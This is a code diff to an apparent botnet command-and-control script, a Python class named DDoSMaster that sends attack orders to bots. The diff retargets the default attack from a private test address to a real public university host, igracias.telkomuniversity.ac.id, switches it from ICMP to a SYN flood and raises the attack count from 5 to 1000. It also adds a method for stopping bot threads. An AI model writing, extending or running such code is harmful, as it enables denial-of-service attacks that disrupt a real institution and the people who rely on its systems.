@@ -31,12 +31,12 @@ class DDoSMaster:
         self.botnets = list(set(self.getBotNetList()))
         self.message = {
             "type": "attack",  # "attack" or "stop"
-            "target_ip": "192.168.1.1",
-            "attack_type": "icmp",
-            "number_of_attack": 5
+            "target_ip": "igracias.telkomuniversity.ac.id",
+            "attack_type": "syn",
+            "number_of_attack": 1000
         }
         self.bot_thread = []
-        self.attack_log = []
+        self.log = []
 
     def distributeCommand(self):
         """distributing command that has been build to botnet"""
@@ -84,6 +84,12 @@ class DDoSMaster:
         elif menu == "3":
             self.botnets = self.getBotNetList()
             self.stopAttack()
+
+    def stopThread(self, ip):
+        for bot in self.bot_thread:
+            if bot.ip == ip:
+                bot._stop()
+                break
 
 
 def getMasterIpAddress():
